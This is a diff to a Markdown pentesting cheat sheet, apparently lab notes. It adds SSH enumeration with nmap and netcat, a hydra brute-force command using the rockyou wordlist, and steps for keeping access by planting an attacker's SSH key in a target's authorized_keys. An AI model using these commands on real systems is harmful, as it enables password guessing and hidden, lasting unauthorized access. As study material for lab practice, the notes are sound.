@@ -106,25 +106,26 @@ nmap 192.60.4.3 --script ftp-brute --script-args userdb=/users -p 21
 | mget  | Download everything |
 | put  | Send/upload one file. |
 
+********************************************************************************
 
 #### 22 SSH
 
-- OpenSSH version 
-    - `nmap 192.238.103.3 -p 22 -sV -O`
-    - `nc 192.238.103.3 22`
-- Checking if Authentication is required and Type of Authentication supported
-    - `nmap 192.238.103.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"`
-- Encryption Algorithm for key supported by SSH server
-    - `nmap 192.238.103.3 -p 22 --script ssh2-enum-algos`
-- Checking ssh-hostkey ie the public key on server
-    - `nmap 192.238.103.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
+**Check OpenSSH version**
+>Note that only openssh versions less than 7 are vulnerable
+- `nmap 192.238.103.3 -p 22 -sV -O`
+- `nc 192.238.103.3 22`
 
-- SSH connection 
-    - `ssh root@192.238.103.3`
-    - `ssh 192.168.204.134 -okexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc`
-    - `ssh -i ssh-key user@192.168.204.132 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`
+- **Make SSH connection** 
+- `ssh root@192.238.103.3`
+- `ssh 192.168.204.134 -okexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc`
+- `ssh -i ssh-key user@192.168.204.132 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`
 
+- **Brute Force**
+```
+hydra -l student -P /usr/share/wordlists/rockyou.txt 192.72.183.3 ssh
+```
 
+#### 23 Telnet
 #### 25 SMTP
 #### 53 DNS
 
@@ -1039,7 +1040,7 @@ Evil-weinrm is better option in case you have it open.
 
 
 
-### [WINDOWS PERSISTENCE](#)
+### [PERSISTENCE](#)
 
 ###### Persistence by RDP (GUI based access) or WinRM (CLI based access)
 - Requirements: We need either RDP (3389) or Winrm (5985) port open on target
@@ -1073,7 +1074,29 @@ Evil-weinrm is better option in case you have it open.
                 - `run getgui -e -u user123 -p hacker_123321`
 
 
+###### Persistence by Adding SSH Public key
 
+1. Generate public and private keys using `ssh-keygen` on attacker machine
+```
+# it will ask you for passphrase, This will create both id_rsa and id_rsa.pub in ~/.ssh directory
+ssh-keygen -t rsa -b 4096 
+```
+2. Copy the content in "id_rsa.pub" 
+3. Now on target machine If the .ssh directory and authorized_keys file don’t exist, you will need to create them, this can be done by running the following commands
+```
+mkdir ~/.ssh
+touch ~/.ssh/authorized_keys
+```
+4. Paste the contents of the public key you generated into the authorized_keys file.
+5. It is also recommended to apply the necessary permissions to the .ssh directory and authorized_keys file, this can be done by running the following commands
+```
+chmod 700 /root/.ssh
+chmod 600 /root/.ssh/authorized_keys
+ ```
+6. you will now be able to authenticate to the target via SSH without providing a password
+```
+ssh -i id_rsa root@10.10.11.136
+```
 ### [LINUX POST EXPLOIT ENUMERATION](#)
 
 
